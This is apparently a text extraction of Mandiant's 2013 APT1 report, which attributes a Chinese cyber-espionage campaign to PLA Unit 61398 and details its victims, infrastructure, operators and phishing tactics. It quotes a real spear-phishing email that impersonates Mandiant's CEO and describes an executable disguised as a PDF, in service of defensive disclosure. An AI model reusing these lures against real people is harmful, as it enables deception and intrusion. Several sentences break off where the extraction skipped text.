“ China’s economic espionage has reached an intolerable level 

and I believe that the United States and our allies in Europe and 
Asia have an obligation to confront Beijing and demand that they 
put a stop to this piracy. 

Beijing is waging a massive trade war on us all, and we should 
band together to pressure them to stop. Combined, the United

Since 2004, Mandiant has investigated computer security breaches at hundreds of organizations around the world. 
The majority of these security breaches are attributed to advanced threat actors referred to as the “Advanced Persistent 
Threat” (APT). We first published details about the APT in our January 2010 M-Trends report. As we stated in the 
report, our position was that “The Chinese government may authorize this activity, but there’s no way to determine the 
extent of its involvement.” Now, three years later, we have the evidence required to change our assessment. The details 
we have analyzed during hundreds of investigations convince us that the groups conducting these activities are based 
primarily in China and that the Chinese Government is aware of them.3 

Mandiant continues to track dozens of APT groups around the world; however, this report is focused on the most 
prolific of these groups. We refer to this group as “APT1” and it is one of more than 20 APT groups with origins in 
China. APT1 is a single organization of operators that has conducted a cyber espionage campaign against a broad 
range of victims since at least 2006. From our observations, it is one of the most prolific cyber espionage groups in 
terms of the sheer quantity of information stolen. The scale and impact of APT1’s operations compelled us to write this 
report.

The activity we have directly observed likely represents only a small fraction of the cyber espionage that APT1 has 
conducted. Though our visibility of APT1’s activities is incomplete, we have analyzed the group’s intrusions against 
nearly 150 victims over seven years. From our unique vantage point responding to victims, we tracked APT1 back 
to four large networks in Shanghai, two of which are allocated directly to the Pudong New Area. We uncovered a 
substantial amount of APT1’s attack infrastructure, command and control, and modus operandi (tools, tactics, and 
procedures). In an effort to underscore there are actual individuals behind the keyboard, Mandiant is revealing three 
personas we have attributed to APT1. These operators, like soldiers, may merely be following orders given to them by 
others.

Our analysis has led us to conclude that APT1 is likely government-sponsored and one of the most persistent of China’s 
cyber threat actors. We believe that APT1 is able to wage such a long-running and extensive cyber espionage campaign 
in large part because it receives direct government support. In seeking to identify the organization behind this activity, 
our research found that People’s Liberation Army (PLA’s) Unit 61398 is similar to APT1 in its mission, capabilities, and 
resources. PLA Unit 61398 is also located in precisely the same area from which APT1 activity appears to originate.

3  Our conclusions are based exclusively on unclassified, open source information derived from Mandiant observations. None of the information in 
this report involves access to or confirmation by classified intelligence.

KEY FINDINGS

aPt1 is believed to be the 2nd Bureau of the People’s Liberation army (PLa) General staff Department’s 
(GsD) 3rd Department (总参三部二局), which is most commonly known by its Military unit Cover 
Designator (MuCD) as unit 61398 (61398部队).
»»

The nature of “Unit 61398’s” work is considered by China to be a state secret; however, we believe it engages in 
harmful “Computer Network Operations.” 

»» Unit 61398 is partially situated on Datong Road (大同路) in Gaoqiaozhen (高桥镇), which is located in the Pudong 

New Area (浦东新区) of Shanghai (上海). The central building in this compound is a 130,663 square foot facility 
that is 12 stories high and was built in early 2007.

»» We estimate that Unit 61398 is staffed by hundreds, and perhaps thousands of people based on the size of Unit 

61398’s physical infrastructure. 

»»

China Telecom provided special fiber optic communications infrastructure for the unit in the name of national 
defense.

»» Unit 61398 requires its personnel to be trained in computer security and computer network operations and also 

requires its personnel to be proficient in the English language. 

»» Mandiant has traced APT1’s activity to four large networks in Shanghai, two of which serve the Pudong New Area 

where Unit 61398 is based.

aPt1 has systematically stolen hundreds of terabytes of data from at least 141 organizations, and has 
demonstrated the capability and intent to steal from dozens of organizations simultaneously.4
»»
Since 2006, Mandiant has observed APT1 compromise 141 companies spanning 20 major industries.

»»

APT1 has a well-defined attack methodology, honed over years and designed to steal large volumes of valuable 
intellectual property.

»» Once APT1 has established access, they periodically revisit the victim’s network over several months or years 
and steal broad categories of intellectual property, including technology blueprints, proprietary manufacturing 
processes, test results, business plans, pricing documents, partnership agreements, and emails and contact lists 
from victim organizations’ leadership. 

»»

»»

»»

»»

APT1 uses some tools and techniques that we have not yet observed being used by other groups including two 
utilities designed to steal email — GETMAIL and MAPIGET.

APT1 maintained access to victim networks for an average of 356 days.5 The longest time period APT1 maintained 
access to a victim’s network was 1,764 days, or four years and ten months.

Among other large-scale thefts of intellectual property, we have observed APT1 stealing 6.5 terabytes of 
compressed data from a single organization over a ten-month time period. 

In the first month of 2011, APT1 successfully compromised at least 17 new victims operating in 10 different 
industries.

 We believe that the extensive activity we have directly observed represents only a small fraction of the cyber espionage that APT1 has conducted. 

4 
Therefore, Mandiant is establishing the lower bounds of APT1 activities in this report.

 This is based on 91 of the 141 victim organizations. In the remaining cases, APT1 activity is either ongoing or else we do not have visibility into 

5 
the last known date of APT1 activity in the network.

aPt1 focuses on compromising organizations across a broad range of industries in english-speaking 
countries. 
»» Of the 141 APT1 victims, 87% of them are headquartered in countries where English is the native language. 

»»

The industries APT1 targets match industries that China has identified as strategic to their growth, including four of 
the seven strategic emerging industries that China identified in its 12th Five Year Plan. 

aPt1 maintains an extensive infrastructure of computer systems around the world.
»»

APT1 controls thousands of systems in support of their computer intrusion activities. 

»»

»»

In the last two years we have observed APT1 establish a minimum of 937 Command and Control (C2) servers 
hosted on 849 distinct IP addresses in 13 countries. The majority of these 849 unique IP addresses were 
registered to organizations in China (709), followed by the U.S. (109). 

In the last three years we have observed APT1 use fully qualified domain names (FQDNs) resolving to 988 unique 
IP addresses.

»» Over a two-year period (January 2011 to January 2013) we confirmed 1,905 instances of APT1 actors logging into 
their attack infrastructure from 832 different IP addresses with Remote Desktop, a tool that provides a remote user 
with an interactive graphical interface to a system.

»»

In the last several years we have confirmed 2,551 FQDNs attributed to APT1. 

In over 97% of the 1,905 times Mandiant observed aPt1 intruders connecting to their attack 
infrastructure, aPt1 used IP addresses registered in shanghai and systems set to use the simplified 
Chinese language.
»»

In 1,849 of the 1,905 (97%) of the Remote Desktop sessions APT1 conducted under our observation, the APT1 
operator’s keyboard layout setting was “Chinese (Simplified) — US Keyboard”. Microsoft’s Remote Desktop client 
configures this setting automatically based on the selected language on the client system. Therefore, the APT1 
attackers likely have their Microsoft® operating system configured to display Simplified Chinese fonts.

»»

817 of the 832 (98%) IP addresses logging into APT1 controlled systems using Remote Desktop resolved back to 
China.

»» We observed 767 separate instances in which APT1 intruders used the “HUC Packet Transmit Tool” or HTRAN 

to communicate between 614 distinct routable IP addresses and their victims’ systems using their attack 
infrastructure. Of the 614 distinct IP addresses used for HTRAN communications: 
»−
»−

613 (99.8%) were registered to one of four Shanghai net blocks. 

614 of 614 (100%) were registered in China.

the size of aPt1’s infrastructure implies a large organization with at least dozens, but potentially 
hundreds of human operators. 
»» We conservatively estimate that APT1’s current attack infrastructure includes over 1,000 servers.

»» Given the volume, duration and type of attack activity we have observed, APT1 operators would need to be directly 

supported by linguists, open source researchers, malware authors, industry experts who translate task requests 
from requestors to the operators, and people who then transmit stolen information to the requestors. 

»»

APT1 would also need a sizable IT staff dedicated to acquiring and maintaining computer equipment, people who 
handle finances, facility management, and logistics (e.g., shipping).

In an effort to underscore that there are actual individuals behind the keyboard, Mandiant is revealing 
three personas that are associated with aPt1 activity. 
»»

The first persona, “UglyGorilla”, has been active in computer network operations since October 2004. His activities 
include registering domains attributed to APT1 and authoring malware used in APT1 campaigns. “UglyGorilla” 
publicly expressed his interest in China’s “cyber troops” in January 2004.

»»

The second persona, an actor we call “DOTA”, has registered dozens of email accounts used to conduct social 
engineering and spear phishing attacks in support of APT1 campaigns. “DOTA” used a Shanghai phone number 
while registering these accounts.

»» We have observed both the “UglyGorilla” persona and the “DOTA” persona using the same shared infrastructure, 

including FQDNs and IP ranges that we have attributed to APT1. 

»»

The third persona, who uses the nickname “SuperHard,” is the creator or a significant contributor to the AURIGA 
and BANGAT malware families which we have observed APT1 and other APT groups use. “SuperHard” discloses 
his location to be the Pudong New Area of Shanghai.

Mandiant is releasing more than 3,000 indicators to bolster defenses against aPt1 operations. 
»»

Specifically, Mandiant is providing the following: 
»− Digital delivery of over 3,000 APT1 indicators, such as domain names, IP addresses, and MD5 hashes of 

malware.

»−

Sample Indicators of Compromise (IOCs) and detailed descriptions of over 40 families of malware in APT1’s 
arsenal of digital weapons. 

Thirteen (13) X.509 encryption certificates used by APT1.

»−
»− A compilation of videos showing actual attacker sessions and their intrusion activities.

»» While existing customers of Mandiant’s enterprise-level products, Mandiant Managed Defense and Mandiant 

Intelligent Response®, have had prior access to these APT1 Indicators, we are also making them available for use 
with Redline™, our free host-based investigative tool. Redline can be downloaded at http://www.mandiant.com/

Conclusion

The sheer scale and duration of sustained attacks against such a wide set of industries from a singularly identified 
group based in China leaves little doubt about the organization behind APT1. We believe the totality of the evidence 
we provide in this document bolsters the claim that APT1 is Unit 61398. However, we admit there is one other unlikely 
possibility:

A secret, resourced organization full of mainland Chinese speakers with direct access to Shanghai-based 
telecommunications infrastructure is engaged in a multi-year, enterprise scale computer espionage campaign 
right outside of Unit 61398’s gates, performing tasks similar to Unit 61398’s known mission.

Why We Are Exposing APT1 

The decision to publish a significant part of our intelligence about Unit 61398 was a painstaking one. What started as 
a “what if” discussion about our traditional non-disclosure policy quickly turned into the realization that the positive 
impact resulting from our decision to expose APT1 outweighed the risk to our ability to collect intelligence on this 
particular APT group. It is time to acknowledge the threat is originating in China, and we wanted to do our part to arm 
and prepare security professionals to combat that threat effectively. The issue of attribution has always been a missing 
link in publicly understanding the landscape of APT cyber espionage. Without establishing a solid connection to China, 
there will always be room for observers to dismiss APT actions as uncoordinated, solely criminal in nature, or peripheral 
to larger national security and global economic concerns. We hope that this report will lead to increased understanding 
and coordinated action in countering APT network breaches.

At the same time, there are downsides to publishing all of this information publicly. Many of the techniques and 
technologies described in this report are vastly more effective when attackers are not aware of them. Additionally, 
publishing certain kinds of indicators dramatically shortens their lifespan. When Unit 61398 changes their techniques 
after reading this report, they will undoubtedly force us to work harder to continue tracking them with such accuracy. It 
is our sincere hope, however, that this report can temporarily increase the costs of Unit 61398’s operations and impede 
their progress in a meaningful way.

We are acutely aware of the risk this report poses for us. We expect reprisals from China as well as an onslaught of 
criticism.

Our research and observations indicate that the Communist Party of  
China (CPC,中国共产党) is tasking the Chinese People’s Liberation Army  
(PLA,中国人民解放军) to commit systematic cyber espionage and data theft 
against organizations around the world. This section provides photos and details 
of Unit 61398 facilities, Chinese references discussing the unit’s training and 
coursework requirements, and internal Chinese communications documenting 
the nature of the unit’s relationship with at least one state-owned enterprise. 
These details will be particularly relevant when we discuss APT1’s expertise, 
personnel, location, and infrastructure, which parallel those of Unit 61398.

The Communist Party of China

The PLA’s cyber command is fully institutionalized within the CPC and able to draw upon the resources of China’s state-
owned enterprises to support its operations. The CPC is the ultimate authority in Mainland China; unlike in Western 
societies, in which political parties are subordinate to the government, the military and government in China are 
subordinate to the CPC. In fact, the PLA reports directly to the CPC’s Central Military Commission (CMC, 中央军事委
员会).6 This means that any enterprise cyber espionage campaign within the PLA is occurring at the direction of senior 
members of the CPC.

We believe that the PLA’s strategic cyber command is situated in the PLA’s General Staff Department (GSD,总参谋
部), specifically its 3rd Department (总参三部).7 The GSD is the most senior PLA department. Similar to the U.S. 
Joint Chiefs of Staff, the GSD establishes doctrine and provides operational guidance for the PLA. Within the GSD, the 
3rd Department has a combined focus on signals intelligence, foreign language proficiency, and defense information

16 regional and functional bureaus.10 We believe that the GSD 3rd Department, 2nd Bureau (总参三部二局), is the 
APT group that we are tracking as APT1. Figure 1 shows how close the 2nd Bureau sits to the highest levels of the 
CPC. At this level, the 2nd Bureau also sits atop a large-scale organization of subordinate offices.

Inferring the Computer Network 
Operations Mission and Capabilities 
of Unit 61398 (61398部队) 

Publicly available references confirm that the 
PLA GSD’s 3rd Department, 2nd Bureau, is 
Military Unit Cover Designator (MUCD) 61398, 
more commonly known as Unit 61398.12 They 
also clearly indicate that Unit 61398 is tasked 
with computer network operations (CNO).13 
The Project 2049 Institute reported in 2011 
that Unit 61398 “appears to function as the 
Third Department`s premier entity targeting the 
United States and Canada, most likely focusing 
on political, economic, and military-related 
intelligence.”14 Our research supports this and 
also suggests Unit 61398’s CNO activities are 
not limited to the U.S. and Canada, but likely 
extend to any organization where English is the 
primary language. 

what is a MuCD?
Chinese military units are given MUCDs, five-digit 
numerical sequences, to provide basic anonymity for the 
unit in question and as a standardized reference that 
facilitates communications and operations (e.g., “Unit 
81356 is moving to the objective,” versus “1st Battalion, 
125th Regiment, 3rd Division, 14th Group Army is 
moving to the objective”). Military Unit Cover Designators 
are also used in official publications and on the Internet 
to refer to the unit in question. The MUCD numbers are 
typically displayed outside a unit’s barracks, as well as on 
the unit’s clothing, flags, and stationary.

Identifying GsD 3rd Department, 2nd Bureau as unit 61398
The care with which the PLA maintains the separation between the GSD 3rd Department, 2nd Bureau, and the MUCD 
61398 can be partially observed by searching the Internet for official documents from the Chinese government that 
refer to both the 2nd Bureau and Unit 61398. Figure 2 shows the results of one of these queries.

FIGure 2: no results found for searching for “GsD 3rd Department 2nd Bureau” and “unit 61398” on any 
Chinese government websites

Despite our challenges finding a link between the Chinese Government and Unit 61398 online, our searches did find 
references online indicating that the GSD 3rd Department, 2nd Bureau, is actually Unit 61398. Specifically, Google 
indexed references to Unit 61398 in forums and resumes. Once these references were discovered by CPC censors, 
these postings and documents were likely modified or removed from the Internet. Figure 3 shows Google search results

Unit 61398 appears to be actively soliciting and training English speaking personnel specializing in a wide variety 
of cyber topics. Former and current personnel from the unit have publicly alluded to these areas of emphasis. For 
example, a graduate student of covert communications, Li Bingbing (李兵兵), who openly acknowledged his affiliation 
with Unit 61398, published a paper in 2010 that discussed embedding covert communications within Microsoft® Word 
documents. Another example is English linguist Wang Weizhong’s (王卫忠) biographical information, provided to the

Additionally, there is evidence that Unit 61398 aggressively recruits new talent from the Science and Engineering 
departments of universities such as Harbin Institute of Technology (哈尔滨工业大学) and Zhejiang University School 
of Computer Science and Technology (浙江大学计算机学院). The majority of the “profession codes” (专业代码) 
describing positions that Unit 61398 is seeking to fill require highly technical computer skills. The group also appears 
to have a frequent requirement for strong English proficiency. Table 2 provides two examples of profession codes for 
positions in Unit 61398, along with the required university courses and proficiencies associated with each profession.20

size and Location of unit 61398’s Personnel and Facilities
Based on the size of Unit 61398’s physical infrastructure, we estimate that the unit is staffed by hundreds, and 
perhaps thousands. This is an extrapolation based on public disclosures from within China describing the location 
and physical installations associated with Unit 61398. For example, public sources confirm that in early 2007, Jiangsu 
Longhai Construction Engineering Group (江苏龙海建工集团有限公司) completed work on a new building for Unit 
61398 located at Datong Road 208 within the Pudong New Area of Shanghai (上海市浦东新区高桥镇大同路208号),21 
which is referred to as the “Unit 61398 Center Building” (61398部队中心大楼). At 12 stories in height, and offering 
130,663 square feet of space, we estimate that this building houses offices for approximately 2,000 people. Figure 4 
through Figure 7 provide overhead views and street-level views of the building and its location, showing its size. This is 
only one of the unit’s several buildings, some of which are even larger.

Unit 61398 also has a full assortment of support units and associated physical infrastructure, much of which is located 
on a stretch of Datong Road (大同路) in Gaoqiaozhen (高桥镇), in the Pudong New Area (浦东新区) of Shanghai (上
海).22 These support units include a logistics support unit, outpatient clinic, and kindergarten, as well as guesthouses 
located both in Gaoqiaozhen and in other locations in Shanghai.23 These amenities are usually associated with large 
military units or units at higher echelons. The close proximity of these amenities supports the contention that Unit 
61398 occupies a high-level position in the PLA organizational hierarchy (see Figure 1: Unit 61398’s positions within 
the PLA).24

PLa unit 61398 and state-owned enterprise China telecom are Co-building Computer network 
operations Infrastructure
Mandiant found an internal China Telecom document online that provides details about the infrastructure provided 
to Unit 61398. The memo (in Figure 8) reveals China Telecom executives deciding to “co-build” with Unit 61398 to 
justify the use of their own inventory in the construction of fiber optic communication lines “based on the principle that 
national defense construction is important.” The letter also appears to indicate that this is a special consideration being 
made outside of China Telecom’s “normal renting method” for Unit 61398. Additionally, the memo clarifies the phrase 
“Unit 61398” with the comment “(GSD 3rd Department, 2nd Bureau).” The memo not only supports the identity 
of Unit 61398 as GSD’s 3rd Department 2nd Bureau, but also reveals the relationship between a “very important 
communication and control department” (Unit 61398) and a state-influenced enterprise.

Market Department Examining Control Affairs Division Report

Requesting Concurrence Concerning the General Staff Department 3rd Department 2nd Bureau 
Request to Use Our Company’s Communication Channel

Division Leader Wu:

The Chinese People’s Liberation Army Unit 61398 (General Staff Department 3rd Department 
2nd Bureau) wrote to us a few days ago saying that, in accordance with their central command 
“8508” on war strategy construction [or infrastructure] need, the General Staff Department 
3rd Department 2nd Bureau (Gaoqiao Base) needs to communicate with Shanghai City 005 
Center (Shanghai Intercommunication Network Control Center within East Gate Bureau) 
regarding intercommunication affairs. This bureau already placed fiber-optic cable at the 
East Gate front entrance [road pole]. They need to use two ports to enter our company’s 
East Gate communication channel. The length is about 30m. At the same time, the second 
stage construction (in Gaoqiao Base) needs to enter into our company’s Shanghai Nanhui 
Communication Park 005 Center (special-use bureau). This military fiber-optic cable has 
already been placed at the Shanghai Nanhui Communication Park entrance. They need to use 
4 of our company ports inside the Nanhui Communication Park to enter. The length is 600m. 
Upon our division’s negotiation with the 3rd Department 2nd Bureau’s communication branch, 
the military has promised to pay at most 40,000 Yuan for each port. They also hope Shanghai 
Telecom will smoothly accomplish this task for the military based on the principle that national 
defense construction is important. After checking the above areas’ channels, our company has a 
relatively abundant inventory to satisfy the military’s request.

This is our suggestion: because this is concerning defense construction, and also the 3rd 
Department 2nd Bureau is a very important communication control department, we agree to 
provide the requested channels according to the military’s suggested price. Because this is a 
one-time payment, and it is difficult to use the normal renting method, we suggest our company 
accept one-time payment using the reason of “Military Co-Construction [with China Telecom] of 
Communication Channels” and provide from our inventory. The military’s co-building does not 
interfere with our proprietary rights. If something breaks, the military is responsible to repair it 
and pay for the expenses. After you agree with our suggestion, we will sign an agreement with 
the communication branch of 61398 and implement it.

Please provide a statement about whether the above suggestion is appropriate or not.

[Handwritten Note]Agree with the Market Department Examining Control Affairs Division 
suggestion; inside the agreement clearly [...define? (illegible) ...] both party’s responsibilities.

Synopsis of PLA Unit 61398 

The evidence we have collected on PLA Unit 61398’s mission and infrastructure reveals an organization that:

»»

Employs hundreds, perhaps thousands of personnel

»» Requires personnel trained in computer security and computer network operations

»» Requires personnel proficient in the English language

»» Has large-scale infrastructure and facilities in the “Pudong New Area” of Shanghai

»» Was the beneficiary of special fiber optic communication infrastructure provided by state-owned enterprise China 

Telecom in the name of national defense

The following sections of this report detail APT1’s cyber espionage and data theft operations. The sheer scale and 
duration of these sustained attacks leave little doubt about the enterprise scale of the organization behind this 
campaign. We will demonstrate that the nature of APT1’s targeted victims and the group’s infrastructure and tactics 
align with the mission and infrastructure of PLA Unit 61398.

Our evidence indicates that APT1 has been stealing hundreds of terabytes of 
data from at least 141 organizations across a diverse set of industries beginning 
as early as 2006. Remarkably, we have witnessed APT1 target dozens of 
organizations simultaneously. Once the group establishes access to a victim’s 
network, they continue to access it periodically over several months or years 
to steal large volumes of valuable intellectual property, including technology 
blueprints, proprietary manufacturing processes, test results, business plans, 
pricing documents, partnership agreements, emails and contact lists from victim 
organizations’ leadership. We believe that the extensive activity we have directly 
observed represents only a small fraction of the cyber espionage that APT1 has 
committed.

APT1 Puts the “Persistent” in APT

Since 2006 we have seen APT1 relentlessly expand its access to new victims. 
Figure 10 shows the timeline of the 141 compromises we are aware of; each 
marker in the figure represents a separate victim and indicates the earliest 
confirmed date of APT1 activity in that organization’s network.26

With the ephemeral nature of electronic evidence, many of the dates of earliest 
known APT1 activity shown here underestimate the duration of APT1’s presence in 
the network.

FIGure 10: timeline showing dates of earliest known aPt1 activity in the 
networks of the 141 organizations in which Mandiant has observed aPt1 
conducting cyber espionage.

26  Figure 10 shows that we have seen APT1 compromise an increasing number of organizations each 
year, which may reflect an increase in APT1’s activity. However, this increase may also simply reflect 
Mandiant’s expanding visibility into APT1’s activities as the company has grown and victims’ awareness 
of cyber espionage activity in their networks has improved.

Mandiant APT1 

20 

www.mandiant.com

Longest time period within
which APT1 has continued 
to access a victim’s network:

4 Years, 10 Months

Once APT1 has compromised a network, they repeatedly monitor and steal 
proprietary data and communications from the victim for months or even 
years. For the organizations in Figure 10, we found that APT1 maintained 
access to the victim’s network for an average of 356 days.27 The longest time 
period APT1 maintained access to a victim’s network was at least 1,764 days, 
or four years and ten months. APT1 was not continuously active on a daily 
basis during this time period; however, in the vast majority of cases we 
observed, APT1 continued to commit data theft as long as they had access to 
the network.

APT1’s Geographic & Industry Focus

The organizations targeted by APT1 primarily conduct their operations in English. However, we have also seen the 
group target a small number of non-English speaking victims. A full 87% of the APT1 victims we have observed are 
headquartered in countries where English is the native language (see Figure 11). This includes 115 victims located 
in the U.S. and seven in Canada and the United Kingdom. Of the remaining 19 victims, 17 use English as a primary 
language for operations. These include international cooperation and development agencies, foreign governments 
in which English is one of multiple official languages, and multinational conglomerates that primarily conduct their 
business in English. Only two victims appear to operate using a language other than English. Given that English-
language proficiency is required for many members of PLA Unit 61398, we believe that the two non-English speaking 
victims are anomalies representing instances in which APT1 performed tasks outside of their normal activities. 

27   This is based on 91 of the 141 victim organizations shown. In the remaining cases, APT1 activity is either ongoing or else we do not have visibility 
into the last known date of APT1 activity in the network.

FIGure 11: Geographic location of aPt1’s victims. In the case of victims with a multinational presence, the 
location shown reflects either the branch of the organization that aPt1 compromised (when known), or else is the 
location of the organization’s headquarters.

APT1 has demonstrated the capability and intent to steal from dozens of organizations across a wide range of 
industries virtually simultaneously. Figure 12 provides a view of the earliest known date of APT1 activity against all of 
the 141 victims we identified, organized by the 20 major industries they represent. The results suggest that APT1’s 
mission is extremely broad; the group does not target industries systematically but more likely steals from an enormous 
range of industries on a continuous basis. Since the organizations included in the figure represent only the fraction 
of APT1 victims that we confirmed directly, the range of industries that APT1 targets may be even broader than our 
findings suggest.

Further, the scope of APT1’s parallel activities implies that the group has significant personnel and technical resources 
at its disposal. In the first month of 2011, for example, Figure 12 shows that APT1 successfully compromised 17 
new victims operating in 10 different industries. Since we have seen that the group remains active in each victim’s 
network for an average of nearly a year after the initial date of compromise, we infer that APT1 committed these 17 
new breaches while simultaneously maintaining access to and continuing to steal data from a number of previously 
compromised victims.

We believe that organizations in all industries related to China’s strategic priorities are potential targets of APT1’s 
comprehensive cyber espionage campaign. While we have certainly seen the group target some industries more  
heavily than others (see Figure 13), our observations confirm that APT1 has targeted at least four of the seven  
strategic emerging industries that China identified in its 12th Five Year Plan.28

APT1 Data Theft

APT1 steals a broad range of information from its victims. The types of information the group has stolen relate to:

»»

product development and use, including information on test results, system designs, product manuals, parts lists, 
and simulation technologies;

»» manufacturing procedures, such as descriptions of proprietary processes, standards, and waste management 

processes;

»»

»»

»»

»»

business plans, such as information on contract negotiation positions and product pricing, legal events, mergers, 
joint ventures, and acquisitions;

policy positions and analysis, such as white papers, and agendas and minutes from meetings involving high-
ranking personnel; 

emails of high-ranking employees; and

user credentials and network architecture information.

It is often difficult for us to estimate how much data APT1 has stolen during their intrusions for several reasons:

»»

»»

»»

»»

APT1 deletes the compressed archives after they pilfer them, leaving solely trace evidence that is usually 
overwritten during normal business activities.

Pre-existing network security monitoring rarely records or identifies the data theft.

The duration of time between the data theft and Mandiant’s investigation is often too great, and the trace evidence 
of data theft is overwritten during the normal course of business. 

Some victims are more intent on assigning resources to restore the security of their network in lieu of investigating 
and understanding the impact of the security breach.

Even with these challenges, we have observed APT1 steal as much as 6.5 terabytes of compressed data from a 
single organization over a ten-month time period. Given the scope of APT1’s operations, including the number of 
organizations and industries we have seen them target, along with the volume of data they are clearly capable of 
stealing from any single organization, APT1 has likely stolen hundreds of terabytes from its victims.

Largest APT1 data theft 
from a single organization:

6.5 Terabytes

over 10 months

Although we do not have direct evidence indicating who receives the information 
that APT1 steals or how the recipient processes such a vast volume of data, we 
do believe that this stolen information can be used to obvious advantage by the 
PRC and Chinese state-owned enterprises. As an example, in 2008, APT1 
compromised the network of a company involved in a wholesale industry. APT1 
installed tools to create compressed file archives and to extract emails and 
attachments. Over the following 2.5 years, APT1 stole an unknown number of 
files from the victim and repeatedly accessed the email accounts of several 
executives, including the CEO and General Counsel. During this same time 
period, major news organizations reported that China had successfully 

negotiated a double-digit decrease in price per unit with the victim organization for one of its major commodities. This 
may be coincidental; however, it would be surprising if APT1 could continue perpetrating such a broad mandate of 
cyber espionage and data theft if the results of the group’s efforts were not finding their way into the hands of entities 
able to capitalize on them.

APT1 In The News

Public reporting corroborates and extends our observations of APT1’s cyber espionage activity. However, several factors 
complicate the process of compiling and synthesizing public reports on APT1. For one thing, information security 
researchers and journalists refer to APT1 by a variety of names. In addition, many cyber security analysts focus on 
writing about tools that are shared between multiple Chinese APT groups without differentiating between the various 
actors that use them.

To assist researchers in identifying which public reports describe the threat group that we identify as APT1, Table 
3 provides a list of APT group nicknames that frequently appear in the media and differentiates between those that 
describe APT1 and those that do not. In addition, below is a list of public reports about Chinese threat actors that we 
have confirmed as referring to APT1.

»»

»»

The earliest known public report about APT1 infrastructure is a 2006 publication from the Japanese division of 
Symantec.30 The report calls out the hostname sb.hugesoft.org, which is registered to an APT1 persona known as 
Ugly Gorilla (discussed later in this report).

In September 2012, Brian Krebs of the “Krebs on Security” cybercrime blog reported on a security breach at 
Telvent Canada Ltd (now Schneider Electric), which we attributed to APT1 based on the tools and infrastructure 
that the hackers used to exploit and gain access to the system.31

aPt1: a ttaCk LIFeCyCLe

APT1 has a well-defined attack methodology, honed over years and designed to steal massive quantities of intellectual 
property. They begin with aggressive spear phishing, proceed to deploy custom digital weapons, and end by exporting 
compressed bundles of files to China – before beginning the cycle again. They employ good English — with acceptable 
slang — in their socially engineered emails. They have evolved their digital weapons for more than seven years, 
resulting in continual upgrades as part of their own software release cycle. Their ability to adapt to their environment 
and spread across systems makes them effective in enterprise environments with trust relationships. 

These attacks fit into a cyclic pattern of activity that we will describe in this section within the framework of Mandiant’s 
Attack Lifecycle model. In each stage we will discuss APT1’s specific techniques to illustrate their tenacity and the 
scale at which they operate. (See Appendix B: “APT and the Attack Lifecycle” for a high-level overview of the steps 
most APT groups take in each stage of the Attack Lifecycle.)

The Initial Compromise

The Initial Compromise represents the methods intruders use to first penetrate a target organization’s network. As with 
most other APT groups, spear phishing is APT1’s most commonly used technique. The spear phishing emails contain 
either a malicious attachment or a hyperlink to a malicious file. The subject line and the text in the email body are 
usually relevant to the recipient. APT1 also creates webmail accounts using real peoples’ names — names that are 
familiar to the recipient, such as a colleague, a company executive, an IT department employee, or company counsel 
— and uses these accounts to send the emails. As a real-world example, this is an email that APT1 sent to Mandiant 
employees:

Date: Wed, 18 Apr 2012 06:31:41 -0700
From: Kevin Mandia <kevin.mandia@rocketmail.com>
Subject: Internal Discussion on the Press 
Release

Hello,
Shall we schedule a time to meet next week?
We need to finalize the press release.
Details click here.

Kevin Mandia

FIGure 15: aPt1 spear Phishing email 

At first glance, the email appeared to be from Mandiant’s CEO, Kevin Mandia. However, further scrutiny shows that 
the email was not sent from a Mandiant email account, but from “kevin.mandia@rocketmail.com”. Rocketmail is a 
free webmail service. The account “kevin.mandia@rocketmail.com” does not belong to Mr. Mandia. Rather, an APT1 
actor likely signed up for the account specifically for this spear phishing event. If anyone had clicked on the link that 
day (which no one did, thankfully), their computer would have downloaded a malicious ZIP file named “Internal_
Discussion_Press_Release_In_Next_Week8.zip”. This file contained a malicious executable that installs a custom APT1 
backdoor that we call WEBC2-TABLE.

Although the files that APT1 actors attach or link to spear phishing emails are not always in ZIP format, this is the 
predominant trend we have observed in the last several years. Below is a sampling of file names that APT1 has used 
with their malicious ZIP files:

The example file names include military, 
economic, and diplomatic themes, 
suggesting the wide range of industries that 
APT1 targets. Some names are also generic 
(e.g., “updated_office_contact_v1.zip”) and 
could be used for targets in any industry.

On some occasions, unsuspecting email 
recipients have replied to the spear 
phishing messages, believing they were 
communicating with their acquaintances. 
In one case a person replied, “I’m not sure 
if this is legit, so I didn’t open it.” Within 20 
minutes, someone in APT1 responded with 
a terse email back: “It’s legit.” 

Okay, thanks!

“It’s legit.”

Some APT1 actors have gone to the trouble of making the malicious software inside their ZIP files look 
like benign Adobe PDF files. Here is an example:

This is not a PDF file. It looks like the filename has a PDF extension but the file name actually includes 
119 spaces after “.pdf” followed by “.exe” — the real file extension. APT1 even went to the trouble of 
turning the executable’s icon to an Adobe symbol to complete the ruse. However, this file is actually a 
dropper for a custom APT1 backdoor that we call WEBC2-QBP. 

Establishing A Foothold

Establishing a foothold involves actions that ensure control of the target network’s systems from outside the network. 
APT1 establishes a foothold once email recipients open a malicious file and a backdoor is subsequently installed. A 
backdoor is software that allows an intruder to send commands to the system remotely. In almost every case, APT 
backdoors initiate outbound connections to the intruder’s “command and control” (C2) server. APT intruders employ 
this tactic because while network firewalls are generally adept at keeping malware outside the network from initiating 
communication with systems inside the network, they are less reliable at keeping malware that is already inside the 
network from communicating to systems outside.

FIGure 17: Backdoors installed on compromised systems usually initiate connections with C2 servers

While APT1 intruders occasionally use publicly available backdoors such as Poison Ivy and Gh0st RAT, the vast 
majority of the time they use what appear to be their own custom backdoors. We have documented 42 families of 
backdoors in “Appendix C: The Malware Arsenal” that APT1 uses that we believe are not publicly available. In addition 
we have provided 1,007 MD5 hashes associated with APT1 malware in Appendix E. We will describe APT1’s backdoors 
in two categories: “Beachhead Backdoors” and “Standard Backdoors.”

Mandiant APT1

www.mandiant.com

Beachhead Backdoors

Beachhead backdoors are typically minimally 
featured. They offer the attacker a toe-hold to 
perform simple tasks like retrieve files, gather 
basic system information and trigger the 
execution of other more significant capabilities 
such as a standard backdoor.

what is a malware family?
A malware family is a collection of malware in which each 
sample shares a significant amount of code with all of 
the others. To help illustrate this, consider the following 
example from the physical world. There is now a vast array 
of computing tablets for sale. These include Apple’s iPad, 
Samsung’s Galaxy Tab, and Microsoft’s Surface. Although 
these are all tablet computers, “under the hood” they are 
probably quite different. However, one can expect that 
an iPad 1 and an iPad 2 share a significant number of 
components — much more than, say, an iPad 1 and a 
Microsoft Surface. Thus it makes sense to refer to the iPad 
“family” and the Surface “family”. 

APT1’s beachhead backdoors are usually 
what we call WEBC2 backdoors. WEBC2 
backdoors are probably the most well-known 
